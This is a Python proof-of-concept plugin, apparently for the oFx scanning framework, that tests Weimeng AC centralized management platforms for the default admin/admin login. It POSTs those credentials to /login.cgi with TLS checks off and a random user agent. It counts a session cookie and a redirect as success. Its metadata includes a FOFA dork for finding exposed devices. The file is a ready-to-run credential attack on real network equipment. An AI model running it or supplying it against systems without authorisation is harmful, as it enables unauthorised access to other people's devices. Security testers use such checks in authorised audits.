# coding:utf-8  
from re import RegexFlag
import requests
from lib.core.common import url_handle,get_random_ua,re
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "维盟AC集中管理平台弱口令",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "AC集中管理平台",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            深圳维盟科技股份有限公司是国内领先的网络设备及智能家居产品解决方案供应商，主营产品包括无线网关、交换机、国外VPN、双频吸顶ap等。  
            AC集中管理平台存在弱口令漏洞，攻击者可利用该漏洞获取敏感信息。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="AC集中管理平台"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/login.cgi" # url自己按需调整
        data = "user=admin&password=admin&Submit=%E7%99%BB+%E5%BD%95"
        
        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            result = re.search("window\.open\('index\.htm\?_\d{10}','_self'\)",req.text.strip())
            if req.status_code == 200 and "ac_userid" in req.headers["Set-Cookie"] and result:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()